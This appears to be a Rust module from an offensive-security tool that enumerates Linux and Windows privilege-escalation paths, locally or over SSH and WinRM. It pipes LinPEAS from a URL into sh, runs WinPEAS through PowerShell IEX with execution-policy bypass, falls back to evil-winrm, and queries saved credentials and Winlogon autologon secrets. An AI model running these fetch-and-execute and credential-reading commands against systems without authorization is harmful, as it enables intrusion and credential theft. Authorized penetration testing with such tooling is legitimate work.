use anyhow::{anyhow, Result};
use log::{info, warn};
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;
use tokio::time::timeout;

use super::linpeas::{parse_linpeas_output, LINPEAS_URL};
use super::linux::{
    check_docker_socket, check_kernel_exploits, check_nfs_no_root_squash,
    check_writable_passwd, parse_capabilities, parse_crontabs, parse_suid_binaries,
    parse_sudo_rules, parse_system_info,
};
use super::types::*;
use super::windows::{
    check_uac_bypass_potential, parse_always_install_elevated, parse_registry_credentials,
    parse_saved_credentials, parse_scheduled_tasks, parse_token_privileges,
    parse_unquoted_service_paths, parse_windows_system_info,
};
use super::winpeas::{parse_winpeas_output, WINPEAS_URL};

/// Run privilege escalation scan
pub async fn run_privesc_scan(config: PrivescConfig) -> Result<PrivescResult> {
    let start_time = chrono::Utc::now();
    info!("Starting privilege escalation scan for target: {}", config.target);

    let mut result = PrivescResult {
        id: uuid::Uuid::new_v4().to_string(),
        target: config.target.clone(),
        os_type: config.os_type,
        status: PrivescStatus::Running,
        config: config.clone(),
        findings: Vec::new(),
        statistics: PrivescStatistics::default(),
        system_info: SystemInfo::default(),
        peas_output: None,
        errors: Vec::new(),
        started_at: start_time,
        completed_at: None,
    };

    match config.os_type {
        OsType::Linux => {
            run_linux_scan(&config, &mut result).await?;
        }
        OsType::Windows => {
            run_windows_scan(&config, &mut result).await?;
        }
    }

    // Calculate statistics
    calculate_statistics(&mut result);

    result.status = PrivescStatus::Completed;
    result.completed_at = Some(chrono::Utc::now());

    info!(
        "Privilege escalation scan completed: {} findings ({} critical, {} high)",
        result.statistics.total_findings,
        result.statistics.critical_findings,
        result.statistics.high_findings
    );

    Ok(result)
}

/// Run Linux-specific privilege escalation checks
async fn run_linux_scan(config: &PrivescConfig, result: &mut PrivescResult) -> Result<()> {
    // Determine connection method
    let connection = if config.ssh_username.is_some() {
        LinuxConnection::Ssh {
            host: config.target.clone(),
            username: config.ssh_username.clone().unwrap(),
            password: config.ssh_password.clone(),
            key_path: config.ssh_key_path.clone(),
            port: config.ssh_port,
        }
    } else {
        LinuxConnection::Local
    };

    // Run PEAS if enabled
    if config.run_peas {
        info!("Running LinPEAS enumeration...");
        match run_linpeas(&connection, config.timeout_secs).await {
            Ok(output) => {
                result.peas_output = Some(output.clone());
                result.findings.extend(parse_linpeas_output(&output));
            }
            Err(e) => {
                warn!("LinPEAS failed: {}", e);
                result.errors.push(format!("LinPEAS failed: {}", e));
            }
        }
    }

    // Run individual checks
    info!("Running individual privilege escalation checks...");

    // Gather system info
    let uname = run_command(&connection, "uname -a", config.timeout_secs).await.unwrap_or_default();
    let hostname = run_command(&connection, "hostname", config.timeout_secs).await.unwrap_or_default();
    let id_output = run_command(&connection, "id", config.timeout_secs).await.unwrap_or_default();
    let env_output = run_command(&connection, "env", config.timeout_secs).await.unwrap_or_default();

    result.system_info = parse_system_info(&uname, &hostname, &id_output, &env_output);

    // Check kernel exploits
    if let Some(ref kernel) = result.system_info.kernel_version {
        result.findings.extend(check_kernel_exploits(kernel));
    }

    // SUID binaries
    let suid_output = run_command(
        &connection,
        "find / -perm -4000 -type f 2>/dev/null",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    result.findings.extend(parse_suid_binaries(&suid_output));

    // Sudo rules
    let sudo_output = run_command(&connection, "sudo -l 2>/dev/null", config.timeout_secs)
        .await
        .unwrap_or_default();
    result.findings.extend(parse_sudo_rules(&sudo_output));

    // Capabilities
    let caps_output = run_command(
        &connection,
        "getcap -r / 2>/dev/null",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    result.findings.extend(parse_capabilities(&caps_output));

    // Cron jobs
    let cron_output = run_command(
        &connection,
        "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; cat /etc/cron.d/* 2>/dev/null",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    let writable_paths = std::collections::HashSet::new();
    result.findings.extend(parse_crontabs(&cron_output, &writable_paths));

    // Docker socket
    let docker_output = run_command(
        &connection,
        "ls -la /var/run/docker.sock 2>/dev/null; groups 2>/dev/null",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    if let Some(finding) = check_docker_socket(&docker_output) {
        result.findings.push(finding);
    }

    // /etc/passwd writable
    let passwd_output = run_command(
        &connection,
        "ls -la /etc/passwd 2>/dev/null",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    if let Some(finding) = check_writable_passwd(&passwd_output) {
        result.findings.push(finding);
    }

    // NFS exports
    let nfs_output = run_command(
        &connection,
        "cat /etc/exports 2>/dev/null",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    result.findings.extend(check_nfs_no_root_squash(&nfs_output));

    Ok(())
}

/// Run Windows-specific privilege escalation checks
async fn run_windows_scan(config: &PrivescConfig, result: &mut PrivescResult) -> Result<()> {
    // Determine connection method
    let connection = if config.winrm_username.is_some() {
        WindowsConnection::WinRm {
            host: config.target.clone(),
            username: config.winrm_username.clone().unwrap(),
            password: config.winrm_password.clone().unwrap_or_default(),
            port: config.winrm_port,
            https: config.winrm_https,
        }
    } else {
        WindowsConnection::Local
    };

    // Run PEAS if enabled
    if config.run_peas {
        info!("Running WinPEAS enumeration...");
        match run_winpeas(&connection, config.timeout_secs).await {
            Ok(output) => {
                result.peas_output = Some(output.clone());
                result.findings.extend(parse_winpeas_output(&output));
            }
            Err(e) => {
                warn!("WinPEAS failed: {}", e);
                result.errors.push(format!("WinPEAS failed: {}", e));
            }
        }
    }

    // Run individual checks
    info!("Running individual privilege escalation checks...");

    // Gather system info
    let systeminfo = run_windows_command(&connection, "systeminfo", config.timeout_secs)
        .await
        .unwrap_or_default();
    let whoami = run_windows_command(&connection, "whoami /all", config.timeout_secs)
        .await
        .unwrap_or_default();

    result.system_info = parse_windows_system_info(&systeminfo, &whoami);

    // Token privileges
    let priv_output = run_windows_command(&connection, "whoami /priv", config.timeout_secs)
        .await
        .unwrap_or_default();
    result.findings.extend(parse_token_privileges(&priv_output));

    // Service permissions
    let service_output = run_windows_command(
        &connection,
        "sc query state= all",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    result.findings.extend(parse_unquoted_service_paths(&service_output));

    // AlwaysInstallElevated
    let aie_output = run_windows_command(
        &connection,
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & \
         reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    if let Some(finding) = parse_always_install_elevated(&aie_output) {
        result.findings.push(finding);
    }

    // Scheduled tasks
    let tasks_output = run_windows_command(
        &connection,
        "schtasks /query /fo LIST /v",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    result.findings.extend(parse_scheduled_tasks(&tasks_output));

    // Saved credentials
    let cmdkey_output = run_windows_command(&connection, "cmdkey /list", config.timeout_secs)
        .await
        .unwrap_or_default();
    result.findings.extend(parse_saved_credentials(&cmdkey_output));

    // AutoLogon
    let autologon_output = run_windows_command(
        &connection,
        "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    result.findings.extend(parse_registry_credentials(&autologon_output));

    // UAC settings
    let uac_output = run_windows_command(
        &connection,
        "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 2>nul",
        config.timeout_secs,
    )
    .await
    .unwrap_or_default();
    result.findings.extend(check_uac_bypass_potential(&uac_output));

    Ok(())
}

/// Linux connection type
enum LinuxConnection {
    Local,
    Ssh {
        host: String,
        username: String,
        password: Option<String>,
        key_path: Option<String>,
        port: u16,
    },
}

/// Windows connection type
enum WindowsConnection {
    Local,
    WinRm {
        host: String,
        username: String,
        password: String,
        port: u16,
        https: bool,
    },
}

/// Run a command on Linux target
async fn run_command(
    connection: &LinuxConnection,
    command: &str,
    timeout_secs: u64,
) -> Result<String> {
    match connection {
        LinuxConnection::Local => run_local_command(command, timeout_secs).await,
        LinuxConnection::Ssh {
            host,
            username,
            password,
            key_path,
            port,
        } => {
            run_ssh_command(host, username, password.as_deref(), key_path.as_deref(), *port, command, timeout_secs).await
        }
    }
}

/// Run a command on Windows target
async fn run_windows_command(
    connection: &WindowsConnection,
    command: &str,
    timeout_secs: u64,
) -> Result<String> {
    match connection {
        WindowsConnection::Local => run_local_windows_command(command, timeout_secs).await,
        WindowsConnection::WinRm {
            host,
            username,
            password,
            port,
            https,
        } => {
            run_winrm_command(host, username, password, *port, *https, command, timeout_secs).await
        }
    }
}

/// Run command locally
async fn run_local_command(command: &str, timeout_secs: u64) -> Result<String> {
    let result = timeout(
        Duration::from_secs(timeout_secs),
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output(),
    )
    .await??;

    let stdout = String::from_utf8_lossy(&result.stdout);
    let stderr = String::from_utf8_lossy(&result.stderr);

    Ok(format!("{}{}", stdout, stderr))
}

/// Run command locally on Windows
async fn run_local_windows_command(command: &str, timeout_secs: u64) -> Result<String> {
    let result = timeout(
        Duration::from_secs(timeout_secs),
        Command::new("cmd")
            .args(["/c", command])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output(),
    )
    .await??;

    let stdout = String::from_utf8_lossy(&result.stdout);
    let stderr = String::from_utf8_lossy(&result.stderr);

    Ok(format!("{}{}", stdout, stderr))
}

/// Run command via SSH
async fn run_ssh_command(
    host: &str,
    username: &str,
    password: Option<&str>,
    key_path: Option<&str>,
    port: u16,
    command: &str,
    timeout_secs: u64,
) -> Result<String> {
    let mut ssh_args = vec![
        "-o".to_string(),
        "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(),
        "UserKnownHostsFile=/dev/null".to_string(),
        "-o".to_string(),
        format!("ConnectTimeout={}", timeout_secs),
        "-p".to_string(),
        port.to_string(),
    ];

    if let Some(key) = key_path {
        ssh_args.push("-i".to_string());
        ssh_args.push(key.to_string());
    }

    ssh_args.push(format!("{}@{}", username, host));
    ssh_args.push(command.to_string());

    // For password auth, we'd need sshpass or expect
    // For now, key-based auth only
    if password.is_some() && key_path.is_none() {
        return Err(anyhow!(
            "Password authentication requires sshpass. Please use key-based authentication."
        ));
    }

    let result = timeout(
        Duration::from_secs(timeout_secs),
        Command::new("ssh")
            .args(&ssh_args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output(),
    )
    .await??;

    let stdout = String::from_utf8_lossy(&result.stdout);
    let stderr = String::from_utf8_lossy(&result.stderr);

    Ok(format!("{}{}", stdout, stderr))
}

/// Run command via WinRM (using Evil-WinRM or similar)
async fn run_winrm_command(
    host: &str,
    username: &str,
    password: &str,
    port: u16,
    https: bool,
    command: &str,
    timeout_secs: u64,
) -> Result<String> {
    // Try using evil-winrm if available
    let protocol = if https { "https" } else { "http" };

    // Use PowerShell remoting via pwsh if available
    let ps_command = format!(
        "$cred = New-Object System.Management.Automation.PSCredential('{}', (ConvertTo-SecureString '{}' -AsPlainText -Force)); \
         Invoke-Command -ComputerName {} -Port {} -Credential $cred -ScriptBlock {{ {} }}",
        username, password, host, port, command
    );

    let result = timeout(
        Duration::from_secs(timeout_secs),
        Command::new("pwsh")
            .args(["-c", &ps_command])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output(),
    )
    .await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            Ok(format!("{}{}", stdout, stderr))
        }
        _ => {
            // Fallback to evil-winrm
            let ewrm_result = timeout(
                Duration::from_secs(timeout_secs),
                Command::new("evil-winrm")
                    .args([
                        "-i", host,
                        "-u", username,
                        "-p", password,
                        "-c", command,
                    ])
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output(),
            )
            .await??;

            let stdout = String::from_utf8_lossy(&ewrm_result.stdout);
            let stderr = String::from_utf8_lossy(&ewrm_result.stderr);
            Ok(format!("{}{}", stdout, stderr))
        }
    }
}

/// Run LinPEAS on target
async fn run_linpeas(connection: &LinuxConnection, timeout_secs: u64) -> Result<String> {
    // Download and execute LinPEAS
    let linpeas_command = format!(
        "curl -sL {} | sh 2>&1",
        LINPEAS_URL
    );

    run_command(connection, &linpeas_command, timeout_secs.max(300)).await
}

/// Run WinPEAS on target
async fn run_winpeas(connection: &WindowsConnection, timeout_secs: u64) -> Result<String> {
    // Download and execute WinPEAS
    let winpeas_command = format!(
        "powershell.exe -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{}')\"",
        WINPEAS_URL
    );

    run_windows_command(connection, &winpeas_command, timeout_secs.max(300)).await
}

/// Calculate statistics from findings
fn calculate_statistics(result: &mut PrivescResult) {
    result.statistics.total_findings = result.findings.len();

    for finding in &result.findings {
        match finding.severity {
            PrivescSeverity::Critical => result.statistics.critical_findings += 1,
            PrivescSeverity::High => result.statistics.high_findings += 1,
            PrivescSeverity::Medium => result.statistics.medium_findings += 1,
            PrivescSeverity::Low => result.statistics.low_findings += 1,
            PrivescSeverity::Info => result.statistics.info_findings += 1,
        }

        // Count by type
        if let Some(ref vector) = finding.linux_vector {
            match vector {
                LinuxPrivescVector::SuidBinary { .. } => result.statistics.suid_binaries += 1,
                LinuxPrivescVector::SudoRule { .. } => result.statistics.sudo_rules += 1,
                LinuxPrivescVector::CronJob { .. } => result.statistics.cron_jobs += 1,
                LinuxPrivescVector::KernelExploit { .. } => result.statistics.kernel_exploits += 1,
                LinuxPrivescVector::WritableService { .. } => result.statistics.service_issues += 1,
                LinuxPrivescVector::PasswordInFile { .. } => result.statistics.credential_findings += 1,
                _ => {}
            }
        }

        if let Some(ref vector) = finding.windows_vector {
            match vector {
                WindowsPrivescVector::UnquotedServicePath { .. }
                | WindowsPrivescVector::WeakServicePermission { .. }
                | WindowsPrivescVector::ModifiableServiceBinary { .. } => {
                    result.statistics.service_issues += 1
                }
                WindowsPrivescVector::RegistryCredential { .. }
                | WindowsPrivescVector::SavedCredentials { .. }
                | WindowsPrivescVector::UnattendedInstall { contains_credentials: true, .. } => {
                    result.statistics.credential_findings += 1
                }
                _ => {}
            }
        }

        // Count exploitable findings
        let is_exploitable = match &finding.linux_vector {
            Some(LinuxPrivescVector::SuidBinary { exploitable, .. }) => *exploitable,
            Some(LinuxPrivescVector::SudoRule { exploitable, .. }) => *exploitable,
            Some(LinuxPrivescVector::Capability { exploitable, .. }) => *exploitable,
            Some(LinuxPrivescVector::CronJob { writable, .. }) => *writable,
            Some(LinuxPrivescVector::DockerSocket { .. }) => true,
            Some(LinuxPrivescVector::KernelExploit { .. }) => true,
            _ => false,
        };

        let is_win_exploitable = match &finding.windows_vector {
            Some(WindowsPrivescVector::AlwaysInstallElevated { .. }) => true,
            Some(WindowsPrivescVector::SeImpersonatePrivilege { .. }) => true,
            Some(WindowsPrivescVector::TokenPrivilege { exploitable, .. }) => *exploitable,
            _ => false,
        };

        if is_exploitable || is_win_exploitable {
            result.statistics.exploitable_count += 1;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_run_local_command() {
        let result = run_local_command("echo test", 10).await;
        assert!(result.is_ok());
        assert!(result.unwrap().contains("test"));
    }
}
